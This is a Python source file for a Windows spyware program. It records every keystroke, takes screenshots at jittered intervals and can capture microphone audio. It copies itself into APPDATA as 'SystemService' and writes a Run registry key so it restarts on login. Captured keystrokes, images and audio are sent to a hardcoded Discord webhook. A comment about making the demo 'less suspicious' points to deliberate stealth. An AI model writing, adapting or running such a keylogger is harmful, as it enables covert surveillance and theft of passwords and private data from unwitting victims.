import os
import sys
import winreg
import pyautogui
import requests
import threading
from datetime import datetime
import pyaudio
import wave
import time
import tempfile
import shutil
import random
from pynput.keyboard import Listener, Key

class DataCollector:
    def __init__(self, webhook_url=None, time_interval=7, copy_name="SystemService"):
        self.webhook_url = webhook_url
        self.time_interval = time_interval
        self.temp_folder = tempfile.gettempdir()
        self.audio_filename = "recording.wav"
        self.text = []
        self.copy_name = copy_name
        self.copy_path = os.path.join(os.getenv("APPDATA"), f"{self.copy_name}.exe")
        self.log_file = os.path.join(self.temp_folder, "system_log.txt")  # Local logging

    def get_unique_filename(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return os.path.join(self.temp_folder, f"capture_{timestamp}.png")

    def take_screenshot(self):
        time.sleep(random.uniform(0.5, 2))  # Random delay
        filename = self.get_unique_filename()
        pyautogui.screenshot(filename)
        return filename

    def safe_remove(self, filepath):
        for _ in range(3):
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
                break
            except PermissionError:
                time.sleep(1)
            except Exception as e:
                print(f"Failed to delete {filepath}: {e}")
                break

    def send_data(self):
        filename = self.take_screenshot()
        try:
            if self.webhook_url:  # Send to webhook if provided
                with open(filename, "rb") as f:
                    files = {"file": (os.path.basename(filename), f, "image/png")}
                    data = {"content": "".join(self.text)}
                    requests.post(self.webhook_url, files=files, data=data)
            else:  # Log locally for demo
                with open(self.log_file, "a") as f:
                    f.write(f"[Capture at {datetime.now()}] {''.join(self.text)}\n")
        except Exception as e:
            print(f"Failed to send/log data: {e}")

        self.safe_remove(filename)
        self.text = []
        threading.Timer(self.time_interval, self.send_data).start()

    def record_audio(self):
        audio = pyaudio.PyAudio()
        try:
            stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        except Exception as e:
            print(f"Failed to open audio stream: {e}")
            audio.terminate()
            return

        frames = []
        try:
            for _ in range(0, int(44100 / 1024 * 10)):
                data = stream.read(1024, exception_on_overflow=False)
                frames.append(data)
        except Exception as e:
            print(f"Error recording audio: {e}")

        stream.stop_stream()
        stream.close()
        audio.terminate()

        audio_path = os.path.join(self.temp_folder, self.audio_filename)
        try:
            with wave.open(audio_path, "wb") as wave_file:
                wave_file.setnchannels(1)
                wave_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                wave_file.setframerate(44100)
                wave_file.writeframes(b"".join(frames))
        except Exception as e:
            print(f"Failed to save audio file: {e}")
            return

        try:
            if self.webhook_url:
                with open(audio_path, "rb") as f:
                    files = {"file": (self.audio_filename, f, "audio/wav")}
                    requests.post(self.webhook_url, files=files)
            else:
                with open(self.log_file, "a") as f:
                    f.write(f"[Audio recorded at {datetime.now()}] Saved as {audio_path}\n")
        except Exception as e:
            print(f"Failed to send/log audio: {e}")

        self.safe_remove(audio_path)
        threading.Timer(60, self.record_audio).start()

    def on_press(self, key):
        try:
            self.text.append(key.char)
        except AttributeError:
            if key == Key.space:
                self.text.append(" ")
            elif key == Key.enter:
                self.text.append("\n")
            elif key == Key.tab:
                self.text.append("\t")
            elif key == Key.backspace:
                if self.text:
                    self.text.pop()
            elif key == Key.esc:
                print("Stopping data collection...")
                return False

    def copy_to_appdata(self):
        try:
            src_path = sys.executable
            if not os.path.exists(self.copy_path):
                shutil.copy(src_path, self.copy_path)
                print(f"Copied to {self.copy_path}")
            else:
                print(f"File already exists at {self.copy_path}")
        except Exception as e:
            print(f"Failed to copy to {self.copy_path}: {e}")

    def add_to_startup_registry(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                 r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                 0, 
                                 winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, self.copy_name, 0, winreg.REG_SZ, self.copy_path)
            winreg.CloseKey(key)
            print(f"Added {self.copy_name} to startup.")
        except Exception as e:
            print(f"Failed to add to startup: {e}")

    def run(self):
        self.copy_to_appdata()
        self.add_to_startup_registry()
        self.send_data()
        # self.record_audio()  # Comment out for less suspicious demo
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
   
    webhook_url = "https://discord.com/api/webhooks/1362362914266288158/lYqfPUXU44QBuCm96OHZvzBe_FFXT_uekatlanSRQQldlDImETzwLR4xF_d1vICgqPXy"  # Set to "YOUR_DISCORD_WEBHOOK_URL" for webhook, None for local logging
    custom_name = "SystemService"  # Change to your desired name
    collector = DataCollector(webhook_url, copy_name=custom_name)
    collector.run()